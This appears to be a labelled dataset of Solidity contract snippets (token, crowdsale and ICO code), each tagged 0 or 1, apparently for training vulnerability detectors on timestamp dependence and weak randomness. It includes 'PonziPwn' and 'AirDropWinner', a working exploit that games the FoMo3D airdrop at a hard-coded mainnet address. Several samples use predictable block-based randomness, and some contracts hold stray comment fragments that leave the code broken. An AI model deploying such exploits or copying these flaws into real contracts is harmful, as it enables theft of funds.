require(whitelist[_beneficiary].stage==Stage.PROCESS3_SUCCESS);    _;  }  function addToWhitelist(address _beneficiary,uint256 _stage) external onlyOwner {      require(_beneficiary != address(0));      require(_stage>0);   if(_stage==1){     whitelist[_beneficiary].stage=Stage.PROCESS1_FAILED;     returnInvestoramount(_beneficiary,adminCharge_p1);     failedWhitelist(_beneficiary);     investedAmountOf[_beneficiary]=0; }else if(_stage==2){     whitelist[_beneficiary].stage=Stage.PROCESS1_SUCCESS; }else if(_stage==3){     whitelist[_beneficiary].stage=Stage.PROCESS2_FAILED;     returnInvestoramount(_beneficiary,adminCharge_p2);     failedWhitelist(_beneficiary);          investedAmountOf[_beneficiary]=0; }else if(_stage==4){     whitelist[_beneficiary].stage=Stage.PROCESS2_SUCCESS; }else if(_stage==5){     whitelist[_beneficiary].stage=Stage.PROCESS3_FAILED;     returnInvestoramount(_beneficiary,adminCharge_p3);     failedWhitelist(_beneficiary);          investedAmountOf[_beneficiary]=0;     }else if(_stage==6){     whitelist[_beneficiary].stage=Stage.PROCESS3_SUCCESS;     afterWhtelisted( _beneficiary); }  }   function withdrawTokens() public isWhitelisted(msg.sender)  {    require(hasClosed());    uint256 amount = balances[msg.sender];    require(amount > 0);    balances[msg.sender] = 0;    _deliverTokens(msg.sender, amount);     }    function changeEndtime(uint256 _endTime) public onlyOwner {    require(_endTime > 0);     closingTime = _endTime;    }  function changeRate(uint256 _rate) public onlyOwner {    require(_rate > 0);     rate = _rate;    emit updateRate(_rate,block.timestamp);    }  function changeAdminCharges(uint256 _p1,uint256 _p2,uint256 _p3) public onlyOwner {    require(_p1 > 0);    require(_p2 > 0);     require(_p3 > 0);     adminCharge_p1=_p1;    adminCharge_p2=_p2;    adminCharge_p3=_p3;        }      function changeMinInvestment(uint256 _minInvestment) public onlyOwner {     require(_minInvestment > 0);     minContribAmount=_minInvestment;  }  function capReached() public view returns (bool) {    return weiRaised >= cap;  }  function goalReached() public view returns (bool) {    return weiRaised >= goal;  }  	function tokenDistribution(address _to, uint256 _value)public onlyOwner {        require (           _to != 0x0 && _value > 0);        _processPurchase(_to, _value);        whitelist[_to].stage=Stage.PROCESS3_SUCCESS;    }}
1<CODESPLIT>contract ANDToken is MintableToken {   string public name="AND TOKEN";  string public symbol="AND";  uint8 public decimals=18;  uint256 public tradeStartTime;  function tradeStarttime(uint256 _startTime)public onlyOwner{       tradeStartTime=_startTime.add(1 years);   }      function hasTrade() public view returns (bool) {    return block.timestamp>tradeStartTime;  }   function transfer(address _to,uint256 _value) public{       require(hasTrade());       require(_to != address(0));        bytes memory empty;        if(isContract(_to)) {             transferToContract(_to, _value, empty);        }        else {            transferToAddress(_to, _value, empty);        }    }         function transfer(address _to, uint256 _value, bytes _data)public  returns (bool success)  {        require(hasTrade());        require(_to != address(0));        if(isContract(_to)) {            transferToContract(_to, _value, _data);        }        else {            transferToAddress(_to, _value, _data);        }        return true;    }  function transferFrom(address _from, address _to, uint256 _value) {    require(hasTrade());    require (_value > 0);    require(_to != address(0));    require(_from != address(0));    require(_value <= balances[_from]);    require(_value <= allowed[_from][msg.sender]);    balances[_from] = balances[_from].sub(_value);    balances[_to] = balances[_to].add(_value);    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);    emit Transfer(_from, _to, _value);    }}
1<CODESPLIT>contract MyDice{    uint private randomNumber;    uint private maxNumber = 10000;    function GetRandomNumber() internal returns(uint randonmNumber) {        randomNumber = randomNumber % block.timestamp + uint256(block.blockhash(block.number - 1));        randomNumber = randomNumber % 80100011001110010011000010110111001101011011110017;        return (maxNumber - randomNumber % maxNumber);    }}
0<CODESPLIT>contract RBAC {    address initialOwner;    using Roles for Roles.Role;    mapping(string => Roles.Role) private roles;    event RoleAdded(address addr, string roleName);    event RoleRemoved(address addr, string roleName);    modifier onlyOwner() {        require(msg.sender == initialOwner);        _;    }    function checkRole(address addr, string roleName) view public {        roles[roleName].check(addr);    }    function hasRole(address addr, string roleName) view public returns (bool) {        return roles[roleName].has(addr);    }    function addRole(address addr, string roleName) public onlyOwner {        roles[roleName].add(addr);        emit RoleAdded(addr, roleName);    }    function removeRole(address addr, string roleName) public onlyOwner {        roles[roleName].remove(addr);        emit RoleRemoved(addr, roleName);    }    modifier onlyRole(string roleName) {        checkRole(msg.sender, roleName);        _;    }}library SafeMath {    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b > 0);        uint256 c = a / b;        assert(a == b * c);        return c;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a - b;        assert(b <= a);        assert(a == c + b);        return c;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        assert(a == c - b);        return c;    }}
0<CODESPLIT>contract MineableToken is MintableToken {   event Commit(address indexed from, uint value,uint atStake, int onBlockReward);  event Withdraw(address indexed from, uint reward, uint commitment);  uint256 totalStake_ = 0;  int256 blockReward_;         //could be positive or negative according to GDP  struct Commitment {    uint256 value;             // value commited to mining    uint256 onBlockNumber;     // commitment done on block    uint256 atStake;           // stake during commitment    int256 onBlockReward;  }  mapping( address => Commitment ) miners;  function commit(uint256 _value) public returns (uint256 commitmentValue) {    require(0 < _value);    require(_value <= balances[msg.sender]);        commitmentValue = _value;    uint256 prevCommit = miners[msg.sender].value;    if (0 < prevCommit) {      uint256 prevReward;      (prevReward, prevCommit) = withdraw();      commitmentValue = prevReward.add(prevCommit).add(_value);    }    balances[msg.sender] = balances[msg.sender].sub(commitmentValue);    emit Transfer(msg.sender, address(0), commitmentValue);    totalStake_ = totalStake_.add(commitmentValue);    miners[msg.sender] = Commitment(      commitmentValue, // Commitment.value      block.number, // onBlockNumber      totalStake_, // atStake = current stake + commitments value      blockReward_ // onBlockReward      );        emit Commit(msg.sender, commitmentValue, totalStake_, blockReward_); // solium-disable-line    return commitmentValue;  }    "uint256 reward": the new supply    "uint256 commitmentValue": the commitment to be returned    }  function withdraw() public returns (uint256 reward, uint256 commitmentValue) {    require(miners[msg.sender].value > 0);     reward = getReward(msg.sender);    Commitment storage commitment = miners[msg.sender];    commitmentValue = commitment.value;    uint256 withdrawnSum = commitmentValue.add(reward);        totalStake_ = totalStake_.sub(commitmentValue);    totalSupply_ = totalSupply_.add(reward);        balances[msg.sender] = balances[msg.sender].add(withdrawnSum);    emit Transfer(address(0), msg.sender, commitmentValue.add(reward));        delete miners[msg.sender];        emit Withdraw(msg.sender, reward, commitmentValue);  // solium-disable-line    return (reward, commitmentValue);  }  function getReward(address _miner) public view returns (uint256) {    if (miners[_miner].value == 0) {      return 0;    }    Commitment storage commitment = miners[_miner];    int256 averageBlockReward = signedAverage(commitment.onBlockReward, blockReward_);        require(0 <= averageBlockReward);        uint256 effectiveBlockReward = uint256(averageBlockReward);        uint256 effectiveStake = average(commitment.atStake, totalStake_);        uint256 numberOfBlocks = block.number.sub(commitment.onBlockNumber);    uint256 miningReward = numberOfBlocks.mul(effectiveBlockReward).mul(commitment.value).div(effectiveStake);           return miningReward;  }  function average(uint256 a, uint256 b) public pure returns (uint256) {    return a.add(b).div(2);  }  function signedAverage(int256 a, int256 b) public pure returns (int256) {    int256 ans = a + b;    if (a > 0 && b > 0 && ans <= 0) {      require(false);    }    if (a < 0 && b < 0 && ans >= 0) {      require(false);    }    return ans / 2;  }  function commitmentOf(address _miner) public view returns (uint256) {    return miners[_miner].value;  }    "uint256 value": the amount commited.    "uint256 onBlockNumber": block number of commitment.    "uint256 atStake": stake when commited.    "int256 onBlockReward": block reward when commited.    }  function getCommitment(address _miner) public view   returns (    uint256 value,             // value commited to mining    uint256 onBlockNumber,     // commited on block    uint256 atStake,           // stake during commit    int256 onBlockReward       // block reward during commit    )   {    value = miners[_miner].value;    onBlockNumber = miners[_miner].onBlockNumber;    atStake = miners[_miner].atStake;    onBlockReward = miners[_miner].onBlockReward;  }  function totalStake() public view returns (uint256) {    return totalStake_;  }  function blockReward() public view returns (int256) {    return blockReward_;  }}
1<CODESPLIT>contract MCoinDistribution is Ownable {  using SafeMath for uint256;  event Commit(address indexed from, uint256 value, uint256 window);  event Withdraw(address indexed from, uint256 value, uint256 window);  event MoveFunds(uint256 value);  MineableToken public MCoin;  uint256 public firstPeriodWindows;  uint256 public firstPeriodSupply;   uint256 public secondPeriodWindows;  uint256 public secondPeriodSupply;    uint256 public totalWindows;  // firstPeriodWindows + secondPeriodSupply  address public foundationWallet;  uint256 public startTimestamp;  uint256 public windowLength;         // in seconds  mapping (uint256 => uint256) public totals;  mapping (address => mapping (uint256 => uint256)) public commitment;    constructor(    uint256 _firstPeriodWindows,    uint256 _firstPeriodSupply,    uint256 _secondPeriodWindows,    uint256 _secondPeriodSupply,    address _foundationWallet,    uint256 _startTimestamp,    uint256 _windowLength  ) public   {    require(0 < _firstPeriodWindows);    require(0 < _firstPeriodSupply);    require(0 < _secondPeriodWindows);    require(0 < _secondPeriodSupply);    require(0 < _startTimestamp);    require(0 < _windowLength);    require(_foundationWallet != address(0));        firstPeriodWindows = _firstPeriodWindows;    firstPeriodSupply = _firstPeriodSupply;    secondPeriodWindows = _secondPeriodWindows;    secondPeriodSupply = _secondPeriodSupply;    foundationWallet = _foundationWallet;    startTimestamp = _startTimestamp;    windowLength = _windowLength;    totalWindows = firstPeriodWindows.add(secondPeriodWindows);    require(currentWindow() == 0);  }  function () public payable {    commit();  }  function init(MineableToken _MCoin) public onlyOwner {    require(address(MCoin) == address(0));    require(_MCoin.owner() == address(this));    require(_MCoin.totalSupply() == 0);    MCoin = _MCoin;    MCoin.mint(address(this), firstPeriodSupply.add(secondPeriodSupply));    MCoin.finishMinting();  }  function allocationFor(uint256 window) view public returns (uint256) {    require(window < totalWindows);        return (window < firstPeriodWindows)       ? firstPeriodSupply.div(firstPeriodWindows)       : secondPeriodSupply.div(secondPeriodWindows);  }  function windowOf(uint256 timestamp) view public returns (uint256) {    return (startTimestamp < timestamp)       ? timestamp.sub(startTimestamp).div(windowLength)       : 0;  }    "uint256 start": window start timestamp    "uint256 end": window end timestamp    "uint256 remainingTime": remaining time (sec), zero if ended    "uint256 allocation": number of tokens to be distributed    "uint256 totalEth": total eth commited this window    "uint256 number": # of requested window    }  function detailsOf(uint256 window) view public     returns (      uint256 start,  // window start timestamp      uint256 end,    // window end timestamp      uint256 remainingTime, // remaining time (sec), zero if ended      uint256 allocation,    // number of tokens to be distributed      uint256 totalEth,      // total eth commited this window      uint256 number         // # of requested window    )     {    require(window < totalWindows);    start = startTimestamp.add(windowLength.mul(window));    end = start.add(windowLength);    remainingTime = (block.timestamp < end) // solium-disable-line      ? end.sub(block.timestamp)            // solium-disable-line      : 0;     allocation = allocationFor(window);    totalEth = totals[window];    return (start, end, remainingTime, allocation, totalEth, window);  }    "uint256 start": window start timestamp    "uint256 end": window end timestamp    "uint256 remainingTime": remaining time (sec), zero if ended    "uint256 allocation": number of tokens to be distributed    "uint256 totalEth": total eth commited this window    "uint256 number": # of requested window    }  function detailsOfWindow() view public    returns (      uint256 start,  // window start timestamp      uint256 end,    // window end timestamp      uint256 remainingTime, // remaining time (sec), zero if ended      uint256 allocation,    // number of tokens to be distributed      uint256 totalEth,      // total eth commited this window      uint256 number         // current window    )  {    return (detailsOf(currentWindow()));  }  function currentWindow() view public returns (uint256) {    return windowOf(block.timestamp); // solium-disable-line  }  function commitOn(uint256 window) public payable {    require(currentWindow() < totalWindows);    require(currentWindow() <= window);    require(window < totalWindows);    require(0.01 ether <= msg.value);    commitment[msg.sender][window] = commitment[msg.sender][window].add(msg.value);    totals[window] = totals[window].add(msg.value);    emit Commit(msg.sender, msg.value, window);  }  function commit() public payable {    commitOn(currentWindow());  }    function withdraw(uint256 window) public returns (uint256 reward) {    require(window < currentWindow());    if (commitment[msg.sender][window] == 0) {      return 0;    }        reward = allocationFor(window).mul(commitment[msg.sender][window]).div(totals[window]);        commitment[msg.sender][window] = 0;    MCoin.transfer(msg.sender, reward);    emit Withdraw(msg.sender, reward, window);    return reward;  }  function withdrawAll() public {    for (uint256 i = 0; i < currentWindow(); i++) {      withdraw(i);    }  }  function getAllRewards() public view returns (uint256[]) {    uint256[] memory rewards = new uint256[](totalWindows);    uint256 lastWindow = currentWindow() < totalWindows ? currentWindow() : totalWindows;    for (uint256 i = 0; i < lastWindow; i++) {      rewards[i] = withdraw(i);    }    return rewards;  }  function getCommitmentsOf(address from) public view returns (uint256[]) {    uint256[] memory commitments = new uint256[](totalWindows);    for (uint256 i = 0; i < totalWindows; i++) {      commitments[i] = commitment[from][i];    }    return commitments;  }  function getTotals() public view returns (uint256[]) {    uint256[] memory ethTotals = new uint256[](totalWindows);    for (uint256 i = 0; i < totalWindows; i++) {      ethTotals[i] = totals[i];    }    return ethTotals;  }  function moveFunds() public onlyOwner returns (uint256 value) {    value = address(this).balance;    require(0 < value);    foundationWallet.transfer(value);        emit MoveFunds(value);    return value;  }}
0<CODESPLIT>contract MCoinDistributionWrap is MCoinDistribution {  using SafeMath for uint256;    uint8 public constant decimals = 18;  // solium-disable-line uppercase  constructor(    uint256 firstPeriodWindows,    uint256 firstPeriodSupply,    uint256 secondPeriodWindows,    uint256 secondPeriodSupply,    address foundationWallet,    uint256 startTime,    uint256 windowLength    )    MCoinDistribution (      firstPeriodWindows,              // uint _firstPeriodWindows      toDecimals(firstPeriodSupply),   // uint _firstPeriodSupply,      secondPeriodWindows,             // uint _secondPeriodDays,      toDecimals(secondPeriodSupply),  // uint _secondPeriodSupply,      foundationWallet,                // address _foundationMultiSig,      startTime,                       // uint _startTime      windowLength                     // uint _windowLength    ) public   {}      function toDecimals(uint256 _value) pure internal returns (uint256) {    return _value.mul(10 ** uint256(decimals));  }}
1<CODESPLIT>contract FENIX is ERC20{    using SafeMath for uint256;             string public constant name = "FENIX";         string public constant symbol = "FNX";    uint8 public constant decimals = 18;    uint public _totalsupply = 1000000000 * 10 ** 18;      address public owner;    uint256 public _price_tokn = 100;       uint256 no_of_tokens;    uint256 total_token;    bool stopped = false;    uint256 public ico_startdate;    uint256 public ico_enddate;    uint256 public preico_startdate;    uint256 public preico_enddate;    bool public icoRunningStatus;    bool public lockstatus;       mapping(address => uint) balances;    mapping(address => mapping(address => uint)) allowed;    address public ethFundMain = 0xBe80a978364649422708470c979435f43e027209;      uint256 public ethreceived;    uint bonusCalculationFactor;    uint256 public pre_minContribution = 100000;     uint256 ContributionAmount;    address public admin;         uint public priceFactor;    mapping(address => uint256) availTokens;    enum Stages {        NOTSTARTED,        PREICO,        ICO,        ENDED    }    Stages public stage;    modifier atStage(Stages _stage) {        require (stage == _stage);        _;    }    modifier onlyOwner(){        require (msg.sender == owner);     _;    }      constructor(uint256 EtherPriceFactor) public    {        require(EtherPriceFactor != 0);        owner = msg.sender;        balances[owner] = 890000000 * 10 ** 18;           stage = Stages.NOTSTARTED;        icoRunningStatus =true;        lockstatus = true;        priceFactor = EtherPriceFactor;        emit Transfer(0, owner, balances[owner]);    }    function () public payable    {        require(stage != Stages.ENDED);        require(!stopped && msg.sender != owner);        if (stage == Stages.PREICO && now <= preico_enddate){             require((msg.value).mul(priceFactor.mul(100)) >= (pre_minContribution.mul(10 ** 18)));          y();    }    else  if (stage == Stages.ICO && now <= ico_enddate){            _price_tokn= getCurrentTokenPrice();                 y();    }    else {        revert();    }    }         function getCurrentTokenPrice() private returns (uint)        {        uint price_tokn;        bonusCalculationFactor = (block.timestamp.sub(ico_startdate)).div(3600);          if (bonusCalculationFactor== 0)             price_tokn = 70;                              else if (bonusCalculationFactor >= 1 && bonusCalculationFactor < 24)             price_tokn = 75;                              else if (bonusCalculationFactor >= 24 && bonusCalculationFactor < 168)             price_tokn = 80;                               else if (bonusCalculationFactor >= 168 && bonusCalculationFactor < 336)             price_tokn = 90;                              else if (bonusCalculationFactor >= 336)             price_tokn = 100;                                           return price_tokn;             }                 function y() private {                         no_of_tokens = ((msg.value).mul(priceFactor.mul(100))).div(_price_tokn);             if(_price_tokn >=80){                 availTokens[msg.sender] = availTokens[msg.sender].add(no_of_tokens);             }             ethreceived = ethreceived.add(msg.value);             balances[address(this)] = (balances[address(this)]).sub(no_of_tokens);             balances[msg.sender] = balances[msg.sender].add(no_of_tokens);             emit  Transfer(address(this), msg.sender, no_of_tokens);    }            function StopICO() external onlyOwner  {        stopped = true;    }         function releaseICO() external onlyOwner    {        stopped = false;    }              function setpricefactor(uint256 newPricefactor) external onlyOwner    {        priceFactor = newPricefactor;            }         function setEthmainAddress(address newEthfundaddress) external onlyOwner    {        ethFundMain = newEthfundaddress;    }         function setAdminAddress(address newAdminaddress) external onlyOwner    {        admin = newAdminaddress;    }         function start_PREICO() external onlyOwner atStage(Stages.NOTSTARTED)      {          stage = Stages.PREICO;          stopped = false;          _price_tokn = 70;                balances[address(this)] =10000000 * 10 ** 18 ;           preico_startdate = now;         preico_enddate = now + 7 days;         emit Transfer(0, address(this), balances[address(this)]);          }        function start_ICO() external onlyOwner atStage(Stages.PREICO)      {          stage = Stages.ICO;          stopped = false;          balances[address(this)] =balances[address(this)].add(100000000 * 10 ** 18);           ico_startdate = now;         ico_enddate = now + 21 days;         emit Transfer(0, address(this), 100000000 * 10 ** 18);          }    function end_ICO() external onlyOwner atStage(Stages.ICO)    {        require(now > ico_enddate);        stage = Stages.ENDED;        icoRunningStatus = false;        uint256 x = balances[address(this)];        balances[owner] = (balances[owner]).add( balances[address(this)]);        balances[address(this)] = 0;       emit  Transfer(address(this), owner , x);            }             function fixSpecications(bool RunningStatusICO) external onlyOwner    {        icoRunningStatus = RunningStatusICO;    }             function removeLocking(bool RunningStatusLock) external onlyOwner    {        lockstatus = RunningStatusLock;    }   function balanceDetails(address investor)        constant        public        returns (uint256,uint256)    {        return (availTokens[investor], balances[investor]) ;    }             function totalSupply() public view returns(uint256 total_Supply) {        total_Supply = _totalsupply;    }         function balanceOf(address _owner)public view returns(uint256 balance) {        return balances[_owner];    }                                  function transferFrom(address _from, address _to, uint256 _amount)public returns(bool success) {        require(_to != 0x0);        require(balances[_from] >= _amount && allowed[_from][msg.sender] >= _amount && _amount >= 0);        balances[_from] = (balances[_from]).sub(_amount);        allowed[_from][msg.sender] = (allowed[_from][msg.sender]).sub(_amount);        balances[_to] = (balances[_to]).add(_amount);        emit Transfer(_from, _to, _amount);        return true;    }              function approve(address _spender, uint256 _amount)public returns(bool success) {        require(_spender != 0x0);        if (!icoRunningStatus && lockstatus) {            require(_amount <= availTokens[msg.sender]);        }        allowed[msg.sender][_spender] = _amount;        emit Approval(msg.sender, _spender, _amount);        return true;    }    function allowance(address _owner, address _spender)public view returns(uint256 remaining) {        require(_owner != 0x0 && _spender != 0x0);        return allowed[_owner][_spender];    }         function transfer(address _to, uint256 _amount) public returns(bool success) {              if ( msg.sender == owner || msg.sender == admin) {            require(balances[msg.sender] >= _amount && _amount >= 0);            balances[msg.sender] = balances[msg.sender].sub(_amount);            balances[_to] += _amount;            availTokens[_to] += _amount;            emit Transfer(msg.sender, _to, _amount);            return true;        }        else        if (!icoRunningStatus && lockstatus && msg.sender != owner) {            require(availTokens[msg.sender] >= _amount);            availTokens[msg.sender] -= _amount;            balances[msg.sender] -= _amount;            availTokens[_to] += _amount;            balances[_to] += _amount;            emit Transfer(msg.sender, _to, _amount);            return true;        }          else if(!lockstatus)         {           require(balances[msg.sender] >= _amount && _amount >= 0);           balances[msg.sender] = (balances[msg.sender]).sub(_amount);           balances[_to] = (balances[_to]).add(_amount);           emit Transfer(msg.sender, _to, _amount);           return true;          }        else{            revert();        }    }     	function transferOwnership(address newOwner)public onlyOwner	{	    require( newOwner != 0x0);	    balances[newOwner] = (balances[newOwner]).add(balances[owner]);	    balances[owner] = 0;	    owner = newOwner;	    emit Transfer(msg.sender, newOwner, balances[newOwner]);	}    function drain() external onlyOwner {        address myAddress = this;        ethFundMain.transfer(myAddress.balance);    }}
0<CODESPLIT>contract RootInBlocks {  address public owner;  mapping(string => uint) map;  modifier onlyOwner() {    require(msg.sender == owner);    _;  }  function put(string hash) public onlyOwner {    require(map[hash] == 0);    map[hash] = block.timestamp;    return;  }}
1<CODESPLIT>contract EDiamondToken is StandardToken, Ownable {    using LockAddressInfo for LockAddressInfo.info;    using SafeMath for uint256;    string public name = "eDiamond";    string public symbol = "EDD";    uint public decimals = 18;    uint public INITIAL_SUPPLY = 10900000000 * (10 ** decimals); //10,900,000,000    mapping(address => LockAddressInfo.info) LOCKED_ACCOUNTS;    constructor() public {        totalSupply_ = INITIAL_SUPPLY;        balances[msg.sender] = INITIAL_SUPPLY;        setInitLockedAccount();    }    function setInitLockedAccount() internal {        LOCKED_ACCOUNTS[0x18dd6FbE4000C1d707d61deBF5352ef86Cd7f12a].isLocked = true;        LOCKED_ACCOUNTS[0x18dd6FbE4000C1d707d61deBF5352ef86Cd7f12a].amount = 10000 * (10 ** decimals);        LOCKED_ACCOUNTS[0x18dd6FbE4000C1d707d61deBF5352ef86Cd7f12a].releaseTime = block.timestamp + 60 * 60 * 24 * 60;    }    function judgeEnableForTransfer(address _from, uint256 _value) public view returns (bool) {        if (!LOCKED_ACCOUNTS[_from].isLocked || block.timestamp > LOCKED_ACCOUNTS[_from].releaseTime) {            return true;        }        uint256 availableMaxTransferAmount = balances[_from].sub(LOCKED_ACCOUNTS[_from].amount);        return availableMaxTransferAmount >= _value;    }    function addLockedAccount(address _to, uint256 _amount, uint _releaseTime) public onlyOwner returns (bool) {        require(!LOCKED_ACCOUNTS[_to].isLocked);        LOCKED_ACCOUNTS[_to].isLocked = true;        LOCKED_ACCOUNTS[_to].amount = _amount;        LOCKED_ACCOUNTS[_to].releaseTime = _releaseTime;        return true;    }    function transfer(address _to, uint256 _value) public returns (bool) {        require(judgeEnableForTransfer(msg.sender, _value));        return super.transfer(_to, _value);    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {        require(judgeEnableForTransfer(_from, _value));        return super.transferFrom(_from, _to, _value);    }}
0<CODESPLIT>contract AmountLimitCrowdsale is Crowdsale, Ownable {	using SafeMath for uint256;	uint256 public min;	uint256 public max;	mapping(address => uint256) public contributions;	function AmountLimitCrowdsale(uint256 _min, uint256 _max) public {		require(_min > 0);		require(_max > _min);		min = _min;		max = _max;	}	function getUserContribution(address _beneficiary) public view returns (uint256) {		return contributions[_beneficiary];	}	function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {		super._preValidatePurchase(_beneficiary, _weiAmount);		require(contributions[_beneficiary].add(_weiAmount) <= max);		require(contributions[_beneficiary].add(_weiAmount) >= min);	}	function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {		super._updatePurchasingState(_beneficiary, _weiAmount);		contributions[_beneficiary] = contributions[_beneficiary].add(_weiAmount);	}}
0<CODESPLIT>contract WhitelistedCrowdsale is Crowdsale, Ownable {	mapping(address => bool) public whitelist;	modifier isWhitelisted(address _beneficiary) {		require(whitelist[_beneficiary]);		_;	}	function addToWhitelist(address _beneficiary) external onlyOwner {		whitelist[_beneficiary] = true;	}	function addManyToWhitelist(address[] _beneficiaries) external onlyOwner {		for (uint256 i = 0; i < _beneficiaries.length; i++) {			whitelist[_beneficiaries[i]] = true;		}	}	function removeFromWhitelist(address _beneficiary) external onlyOwner {		whitelist[_beneficiary] = false;	}	function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal isWhitelisted(_beneficiary) {		super._preValidatePurchase(_beneficiary, _weiAmount);	}}
1<CODESPLIT>contract T2TCrowdsale is WhitelistedCrowdsale, AmountLimitCrowdsale, CappedCrowdsale,TimedCrowdsale, Pausable {	using SafeMath for uint256;	uint256 public distributeTime;	mapping(address => uint256) public balances;	function T2TCrowdsale(uint256 rate, 		uint256 openTime, 		uint256 closeTime, 		uint256 totalCap,		uint256 userMin,		uint256 userMax,		uint256 _distributeTime,		address account,		StandardToken token)		Crowdsale(rate, account, token)		TimedCrowdsale(openTime, closeTime)		CappedCrowdsale(totalCap)		AmountLimitCrowdsale(userMin, userMax) public {	  distributeTime = _distributeTime;	}	function withdrawTokens(address _beneficiary) public {	  require(block.timestamp > distributeTime);	  uint256 amount = balances[_beneficiary];	  require(amount > 0);	  balances[_beneficiary] = 0;	  _deliverTokens(_beneficiary, amount);	}	function distributeTokens(address[] _beneficiaries) external onlyOwner {		for (uint256 i = 0; i < _beneficiaries.length; i++) {			require(block.timestamp > distributeTime);			address _beneficiary = _beneficiaries[i];			uint256 amount = balances[_beneficiary];			if(amount > 0) {				balances[_beneficiary] = 0;				_deliverTokens(_beneficiary, amount);			}		}	}	function returnTokens(address _beneficiary, uint256 amount) external onlyOwner {		_deliverTokens(_beneficiary, amount);	}	function _processPurchase(	  address _beneficiary,	  uint256 _tokenAmount	)	internal {	  balances[_beneficiary] = balances[_beneficiary].add(_tokenAmount);	}	function buyTokens(address beneficiary) public payable whenNotPaused {	  super.buyTokens(beneficiary);	}}
0<CODESPLIT>contract BlankContract {    constructor() public {}} 
0<CODESPLIT>contract AirDropWinner {         FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);         constructor() public {        if(!address(fomo3d).call.value(0.1 ether)()) {           fomo3d.withdraw();           selfdestruct(msg.sender);        }    }}
0<CODESPLIT>contract PonziPwn {    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);        address private admin;    uint256 private blankContractGasLimit = 20000;    uint256 private pwnContractGasLimit = 250000;                uint256 private gasPrice = 10;    uint256 private gasPriceInWei = gasPrice*1e9;             uint256 private blankContractCost = blankContractGasLimit*gasPrice ;    uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;    uint256 private maxAmount = 10 ether;        modifier onlyAdmin() {        require(msg.sender == admin);        _;    }    constructor() public {        admin = msg.sender;    }    function checkPwnData() private returns(uint256,uint256,address) {                 address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));        uint256 _nContracts = 0;        uint256 _pwnCost = 0;        uint256 _seed = 0;        uint256 _tracker = fomo3d.airDropTracker_();        bool _canWin = false;        while(!_canWin) {                         _seed = uint256(keccak256(abi.encodePacked(                   (block.timestamp) +                   (block.difficulty) +                   ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +                   (block.gaslimit) +                   ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +                   (block.number)            )));                                      if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {                    _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));                    _nContracts++;                    _pwnCost+= blankContractCost;            } else {                    _canWin = true;                                         _pwnCost += pwnContractCost;            }        }        return (_pwnCost,_nContracts,_newSender);    }    function deployContracts(uint256 _nContracts,address _newSender) private {                 for(uint256 _i; _i < _nContracts; _i++) {            if(_i++ == _nContracts) {               address(_newSender).call.value(0.1 ether)();               new AirDropWinner();            }            new BlankContract();        }    }         function beginPwn() public onlyAdmin() {        uint256 _pwnCost;        uint256 _nContracts;        address _newSender;        (_pwnCost, _nContracts,_newSender) = checkPwnData();        	         if(_pwnCost + 0.1 ether < maxAmount) {           deployContracts(_nContracts,_newSender);        }    }         function withdraw() public onlyAdmin() {        admin.transfer(address(this).balance);    }}
0<CODESPLIT>contract BasicAccessControl {    function getRandom(uint _seed) constant public returns(uint) {        return uint(keccak256(block.timestamp, block.difficulty)) ^ _seed;    }}
1<CODESPLIT>contract Namahecrowdsale{    uint256 public openingTime;    uint256 public rate = 1000;         function getRate() public view returns (uint256) {        if (block.timestamp <= (openingTime + (14 days))) {            return rate + (200);        }        return rate;    }}
1<CODESPLIT>contract MineralFactory {    uint32 public oresLeft;    function _getRandomMineralId() private view returns (uint32) {        return uint32(uint256(keccak256(block.timestamp, block.difficulty)) % oresLeft);    }}
1<CODESPLIT>contract MineralMarket {    mapping(address => uint) internal ownerGemCount;    mapping (uint256 => address) public gemIndexToOwner;    Gemstone[] public gemstones;    struct Gemstone {        uint category;        string name;        uint256 colour;        uint64 polishedTime;        uint256 price;    }    address public addressDev;    modifier onlyOwner() {        require(msg.sender == addressDev);        _;    }    function mintGem(uint _categoryIdx, string _name, uint256 _colour, bool _polished, uint256 _price) onlyOwner external returns (uint) {        uint64 stamp = 0;        if (_polished) {            stamp = uint64(block.timestamp);        }        Gemstone memory _stone = Gemstone({            category : _categoryIdx,            name : _name,            colour : _colour,            polishedTime : stamp,            price : _price        });        uint256 newStoneId = gemstones.push(_stone) - 1;        return newStoneId;    }}
0<CODESPLIT>contract DefaultFinalizeAgent is FinalizeAgent {  ReleasableToken public token;  Crowdsale public crowdsale;  function DefaultFinalizeAgent(ReleasableToken _token, Crowdsale _crowdsale) {    token = _token;    crowdsale = _crowdsale;  }     function isSane() public constant returns (bool) {    return (token.releaseAgent() == address(this));  }     function finalizeCrowdsale() public {    if (msg.sender != address(crowdsale)) {      revert();    }    token.releaseTokenTransfer();  }}
